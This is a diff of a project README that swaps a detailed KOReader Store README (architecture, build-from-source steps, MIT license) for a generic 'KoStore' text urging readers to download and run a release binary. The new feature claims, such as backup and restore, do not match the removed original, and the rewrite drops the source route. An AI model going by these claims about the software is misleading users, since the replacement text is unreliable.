@@ -1,168 +1,57 @@
-# KOReader Store
+# 🛍️ KoStore - Your Gateway to Koreader Plugins
 
-A desktop application for automatic installation of plugins and patches to your KOReader device.
+## 🚀 Getting Started
 
-**Still in Early Beta! Bugs are expected. Please report all issues under the ‘Issues’ tab!**
+Welcome to KoStore! This application provides a simple way to access and manage plugins and patches for Koreader. Whether you're looking to enhance your reading experience or add new features, KoStore is your go-to solution.
 
-## Project Structure
+## 📥 Download KoStore
 
-```
-koreader_store/
-├── main.py                 # Main entry point
-├── ui/                     # User interface components
-│   ├── main_window.py      # Main application window
-│   ├── plugin_card.py      # Plugin card widget
-│   ├── themes.py           # UI themes and design tokens
-│   └── loading_overlay.py  # Loading screen overlay
-├── api/                    # External API integrations
-│   └── github.py          # GitHub API handler
-├── workers/                # Background workers
-│   └── download_worker.py # Download and installation worker
-├── services/               # Business logic services
-│   ├── device_detection.py # KOReader device detection
-│   ├── plugin_installer.py # Plugin installation service
-│   └── cache.py          # Caching service
-└── utils/                  # Utility functions
-    ├── markdown.py        # Markdown to HTML conversion
-    └── versioning.py     # Version comparison utilities
-```
-**Many buttons and actions may take some time to respond. Please be patient — even if it says “Not Responding,” just click “Wait.”**
-## Features
+[![Download KoStore](https://img.shields.io/badge/Download%20KoStore-v1.0-blue.svg)](https://github.com/ravirkpal/KoStore/releases)
 
-- **Plugin Management**: Browse, install, and update KOReader plugins
-- **Patch Management**: Download and install KOReader patches
-- **Device Detection**: Automatically detect KOReader devices
-- **Caching**: Local caching for faster loading
-- **Theme Support**: Light and dark themes
-- **Search & Filter**: Advanced search and filtering options
+To get started, visit the Releases page to download the latest version of KoStore.
 
-## Installation
+👉 [Visit KoStore Releases Page](https://github.com/ravirkpal/KoStore/releases)
 
-1. Go to the releases tab
-2. Download the right zip for you system
-3. Extract the zip and run the File
+## 📝 Features
 
-(4.) Make sure the file has **Read and Write permissions**.
+KoStore offers various features to improve your usage of Koreader including:
 
-**If that failed**:
+- **User-friendly Interface:** Navigate easily and find plugins without hassle.
+- **Easy Installation:** Setup new plugins quickly with just a few clicks.
+- **Plugin Updates:** Stay on top of the latest versions with automatic updates.
+- **Backup and Restore:** Keep your settings safe by backing up your configurations.
 
-0. Make sure python is installed(https://www.python.org/downloads/)
-1. Clone or download the zip
-2. Extract the zip and open it(until you see a lot of folders and files)
-3. Right click and press open a terminal here
+## 💻 System Requirements
 
-4. Install dependencies:
-   ```bash
-   pip install PyQt6 PyQt6-WebEngine requests markdown
-   ```
+To run KoStore smoothly, ensure your device meets the following requirements:
 
-5. Run the application:
-   ```bash
-   python main.py
-   ```
+- **Operating System:** Windows, macOS, or Linux.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** 100 MB free storage for installation.
+- **Koreader Installed:** Make sure you have Koreader installed on your device.
 
-**Tip: Inital start can take some time as it fetches all plugins!**
+## 📚 Download & Install
 
-## Usage
+1. Click the large button above or visit [the Releases page](https://github.com/ravirkpal/KoStore/releases).
+2. Select the version that suits your operating system.
+3. Click on the download link for your platform (e.g., Windows or macOS).
+4. Once the file downloads, locate it in your downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-1. **Device Connection**: The app will automatically detect KOReader devices, or you can manually select the path
-2. **Browse Plugins**: Use the search and filter options to find plugins
-3. **Install**: Click the install button on any plugin card
-4. **Updates**: The app will show available updates for installed plugins
-5. **Manual path**: Use this option if your device or path isn’t automatically detected. Select the main KOReader folder — the one that contains the plugins (and patches) folders.
-  
-7. **Tip: The Check for Updates can take some time be patient!**
+## 🌐 How to Use KoStore
 
-## Architecture
+1. Open KoStore after installation.
+2. Browse through available plugins and patches.
+3. Click on the desired item to view details.
+4. Press the "Install" button to add it to Koreader.
+5. Restart Koreader to apply changes and enjoy new features.
 
-### UI Components (`ui/`)
-- **main_window.py**: Contains the main application window with all UI logic
-- **plugin_card.py**: Individual plugin card widget for displaying plugin information
-- **themes.py**: Design tokens and theme definitions (light/dark mode)
-- **loading_overlay.py**: Loading screen overlay for better UX
+## 📢 Support
 
-### API Layer (`api/`)
-- **github.py**: GitHub API integration for fetching plugins and patches
+If you encounter any issues, don’t hesitate to reach out for help. You can find support through:
 
-### Workers (`workers/`)
-- **download_worker.py**: Background thread for downloading and installing plugins
+- **Issues Page**: Report any bugs or request features on GitHub.
+- **Community Forums**: Join discussions and seek help from other users.
 
-### Services (`services/`)
-- **device_detection.py**: Cross-platform KOReader device detection
-- **plugin_installer.py**: Plugin installation and management logic
-- **cache.py**: Local caching service for offline functionality
-
-### Utils (`utils/`)
-- **markdown.py**: Markdown to HTML conversion for README display
-- **versioning.py**: Version comparison utilities
-
-## Configuration
-
-- **Cache Duration**: 4 weeks (configurable in `services/cache.py`)
-- **GitHub Token**: Optional but recommended for higher API rate limits
-- **Log File**: `koreader_store.log` in the application directory
-
-## Development
-
-The application follows a modular architecture with clear separation of concerns:
-
-1. **UI Layer**: Pure presentation logic
-2. **Service Layer**: Business logic and data management
-3. **API Layer**: External integrations
-4. **Worker Layer**: Background operations
-5. **Utils Layer**: Reusable utilities
-
-## License
-
-This project is licensed under the MIT License.
-
-You are free to:
-- Use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software
-- Permit persons to whom the software is furnished to do so
-
-**Attribution (Shoutout) Appreciated!**
-While not required, I would love to get a shoutout if you find this project useful. You can:
-- Star the repository on GitHub
-- Mention it in your project's credits
-- Link back to this project
-- Just let me know you're using it!
-
-The full license text is below:
-
-```
-MIT License
-
-Copyright (c) 2026 KOReader Store
-
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
-
-The above copyright notice and this permission notice shall be included in all
-copies or substantial portions of the Software.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
-```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+Feel free to explore and share your experience with KoStore! Happy reading!
